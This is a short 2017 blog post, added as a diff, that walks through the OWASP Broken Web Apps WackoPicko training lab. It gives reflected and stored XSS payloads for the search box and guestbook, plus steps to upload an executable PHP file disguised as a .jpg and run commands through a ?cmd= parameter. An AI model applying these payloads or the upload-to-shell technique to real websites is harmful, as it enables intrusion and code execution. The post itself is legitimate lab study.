@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+      <meta http-equiv="X-UA-Compatible" content="IE=edge">
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+      <!-- Enable responsiveness on mobile devices-->
+      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+      <title>m4l1c3.github.io</title>
+
+      
+        <link rel="alternate" type="application/atom+xml" title="RSS" href="https://m4l1c3.github.io/atom.xml">
+      
+
+      
+          <link rel="stylesheet" href="https://m4l1c3.github.io/site.css">
+      
+
+      
+      
+    </head>
+
+    <body class="hack dark main container">
+        
+    
+        
+                
+                    <header>
+                        <nav itemscope itemtype="http://schema.org/SiteNavigationElement">
+                        
+                            <a itemprop="url"
+                               class=""
+                               href="https:&#x2F;&#x2F;m4l1c3.github.io">
+                                <span itemprop="name">Home
+                                </span></a>
+                        
+                            <a itemprop="url"
+                               class=""
+                               href="https:&#x2F;&#x2F;m4l1c3.github.io&#x2F;categories">
+                                <span itemprop="name">Categories
+                                </span></a>
+                        
+                            <a itemprop="url"
+                               class=""
+                               href="https:&#x2F;&#x2F;m4l1c3.github.io&#x2F;tags">
+                                <span itemprop="name">Tags
+                                </span></a>
+                        
+                            <a itemprop="url"
+                               class=""
+                               href="https:&#x2F;&#x2F;m4l1c3.github.io&#x2F;atom.xml">
+                                <span itemprop="name">Feed
+                                </span></a>
+                        
+                        </nav>
+                    </header>
+                
+            
+    
+
+<article itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+        <h1 itemprop="headline">OWASP Broken Web Apps WackoPicko</h1>
+        <span class="muted">
+    <svg style="margin-bottom:-3px" class="i-clock" viewBox="0 0 32 32"
+         width="16" height="16" fill="none" stroke="currentcolor"
+         stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+        <circle cx="16" cy="16" r="14"/>
+        <path d="M16 8 L16 16 20 20"/>
+    </svg>
+    <span>1 minute read</span>
+    <svg style="margin-bottom: -3px" class="i-edit" viewBox="0 0 32 32"
+         width="16" height="16" fill="none" stroke="currentcolor"
+         stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+        <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z"/>
+    </svg>
+
+    Published: 2017-04-10
+</span>
+    </header>
+    <div itemprop="articleBody">
+      <p>Right off the bat, try hitting the search box with a simple XSS payload:</p>
+<pre data-lang="javascript" class="language-javascript "><code class="language-javascript" data-lang="javascript">search.php?query=&lt;script&gt;alert(1)&lt;%2Fscript&gt;&x=24&y=12
+</code></pre>
+<p>#/guestbook.php</p>
+<p>Placing this:</p>
+<pre data-lang="html" class="language-html "><code class="language-html" data-lang="html">&lt;script&gt;confirm(1)&lt;/script&gt;
+&lt;img src=x onerror='confirm(2)' /&gt;
+</code></pre>
+<p>into a comment body yields stored XSS</p>
+<p>Next I made an account and started uploading stuff, turns out php files are uploadable and executable:</p>
+<ol>
+<li>Make the file's name be: whatever.php</li>
+<li>Make its extension: .jpg</li>
+<li>Upload</li>
+<li>Open the broken image on the page you're redirected to and open its URL in a new tab, remove the 550 from the URL</li>
+<li>?cmd=ls -latr</li>
+</ol>
+
+    </div>
+
+    
+        <footer>
+            <hr>
+            <p>
+                
+                    Published by m4l1c3
+                
+                
+                    
+                    in <a href="https://m4l1c3.github.io/categories/vulnerable-web-app/">vulnerable-web-app</a>
+                
+                
+                    and tagged
+                    
+                        <a href="https://m4l1c3.github.io/tags/web/">web</a>
+                        
+                            
+                                
+                                    and
+                                
+                            
+                        
+                    
+                        <a href="https://m4l1c3.github.io/tags/owasp/">owasp</a>
+                        
+                            
+                        
+                    
+                
+            </p>
+            
+            
+        </footer>
+    
+</article>
+
+
+    </body>
+
+</html>
